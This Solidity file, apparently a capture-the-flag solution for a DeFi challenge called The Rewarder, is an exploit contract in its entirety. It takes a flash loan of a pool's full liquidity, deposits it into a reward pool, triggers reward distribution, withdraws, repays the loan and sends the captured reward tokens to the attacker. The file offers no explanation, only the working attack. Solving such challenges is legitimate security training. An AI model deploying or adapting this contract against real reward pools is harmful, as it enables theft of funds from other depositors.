pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amount) external;
    function distributeRewards() external returns (uint256 rewards);
    function withdraw(uint256 amount) external;
}

contract AttackTheRewarder {

    IFlashloanPool immutable flashLoanPool;
    IRewardPool immutable rewardPool;
    IERC20 immutable liquidityToken;
    IERC20 immutable rewardToken;
    address immutable player;

    constructor(
        address _flashloanPool, address _rewardPool, address _liquidityToken, address _rewardToken
    ){
        flashLoanPool = IFlashloanPool(_flashloanPool);
        rewardPool = IRewardPool(_rewardPool);
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
        player = msg.sender;
    }

    function attack() external {
        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
    }


    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanPool));
        require(tx.origin == player);

        // Deposit --> Get Rewards --> Withdraw
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.distributeRewards();
        rewardPool.withdraw(amount);

        // Pay back the loan & send reward tokens to player
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }

}